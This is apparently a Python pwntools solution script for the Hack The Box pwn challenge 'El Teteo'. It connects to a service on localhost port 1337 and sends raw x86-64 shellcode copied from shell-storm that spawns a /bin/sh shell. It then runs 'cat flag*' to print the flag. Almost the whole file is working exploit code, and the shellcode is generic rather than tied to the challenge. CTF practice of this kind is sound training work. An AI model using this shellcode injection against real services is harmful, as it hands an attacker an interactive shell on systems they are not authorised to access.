# https://app.hackthebox.com/challenges/El%2520Teteo
# Tags: pwn
from pwn import *

warnings.filterwarnings('ignore')
context.arch = 'amd64'

IP="127.0.0.1"
PORT=1337

target = remote(IP, PORT)
# https://shell-storm.org/shellcode/files/shellcode-806.html
shell_code = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
target.sendafter(">", shell_code)
pause(1)
target.sendline("cat flag*")
flag = target.recvline_contains(b"HTB").strip().decode()
print(f"[\u2714] Flag captured: \033[1;37m{flag}\033[0m")